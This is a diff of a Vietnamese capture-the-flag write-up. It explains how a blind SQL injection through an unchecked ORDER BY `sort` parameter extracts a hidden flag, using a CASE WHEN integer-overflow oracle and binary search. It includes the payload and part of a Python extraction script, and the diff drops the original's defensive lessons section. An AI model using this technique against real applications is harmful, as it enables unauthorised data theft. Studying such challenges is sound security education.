@@ -9,39 +9,27 @@ tags:
   - SQLite
 ---
 
-# Doctor Bye Bye — Write-up
+## Solution
 
-**Thể loại:** Web · **Kỹ thuật:** Blind SQL Injection (qua `ORDER BY`)
+Endpoint `/api/on-call` đưa tham số `sort` thẳng vào `ORDER BY` của câu SQL trong `app.py`, không kiểm tra gì cả, nên viết biểu thức SQL vào `sort` là được. Response không lộ dữ liệu ra ngoài nên đây là blind SQLi.
 
-## Tóm tắt
+`initialize_database` chèn sẵn một bác sĩ `id=404` không hiển thị trong danh sách (`listed=0`), flag nằm trong cột `farewell_note` của record này.
 
-Endpoint `/api/on-call` đưa tham số `sort` thẳng vào `ORDER BY` của câu SQL. Kết quả trả về không lộ dữ liệu, nên ta dùng **blind SQLi**: mỗi câu hỏi đúng/sai được chuyển thành HTTP 200 hoặc 400. Flag nằm ở một bản ghi bị ẩn (`id = 404`, `listed = 0`) trong cột `farewell_note`.
+Vấn đề là cần một oracle để phân biệt đúng/sai. Dùng `CASE WHEN` kèm lỗi tràn số nguyên:
 
-## Phân tích
-
-- `initialize_database` chèn sẵn một bác sĩ `id=404` không hiển thị trong danh sách (`listed=0`), với flag trong `farewell_note`.
-- Trong `app.py`, `sort` không được kiểm tra, nên có thể viết biểu thức SQL vào `ORDER BY`.
-
-## Oracle (phân biệt đúng/sai)
-
-Dùng `CASE WHEN` và lỗi tràn số nguyên:
-
-```sql
+```sql!
 CASE WHEN (<điều kiện>) THEN 1 ELSE abs(-9223372036854775807-1) END
 ```
 
-- Điều kiện **đúng** → `ORDER BY 1` → HTTP **200**.
-- Điều kiện **sai** → `abs(min int64)` gây tràn số → HTTP **400**.
+Điều kiện đúng -> `ORDER BY 1` -> HTTP 200. Điều kiện sai -> `abs(min int64)` tràn số -> HTTP 400. Từ đây binary search từng ký tự của `farewell_note`:
 
-## Khai thác
-
-1. Dùng binary search để lấy độ dài flag: `length(farewell_note) > x`.
+1. Lấy độ dài flag: `length(farewell_note) > x`.
 2. Với từng vị trí `i`, binary search mã Unicode: `unicode(substr(farewell_note, i, 1)) > x`.
 3. Ghép các ký tự lại.
 
-Script đầy đủ (đã chạy thử trên bản local với flag giả):
+Script chạy (đã test với flag giả trên bản local):
 
-```python
+```python!
 import sys, urllib.parse, urllib.request
 
 BASE = sys.argv[1].rstrip("/")
@@ -74,9 +62,6 @@ flag = "".join(
 print(flag)
 ```
 
-Lưu ý: app kiểm tra flag bằng `endswith("}")`, nên khi tạo file flag trên máy local không được có ký tự xuống dòng cuối (dùng `printf` thay vì `echo`).
+Lưu ý: app check flag bằng `endswith("}")`, nên nếu tạo file flag giả trên local để test thì đừng để dính ký tự xuống dòng ở cuối (dùng `printf` thay vì `echo`), không là tự bẻ oracle của chính mình.
 
-## Bài học
-
-- Không nối tham số người dùng vào `ORDER BY`. Phải dùng whitelist cho tên cột/chiều sắp xếp.
-- Ngay cả khi không có dữ liệu trả về, blind SQLi vẫn lấy được dữ liệu qua khác biệt trạng thái (200/400, thời gian, v.v.).
+-> Flag: lấy ra qua binary search từng byte của `farewell_note`.
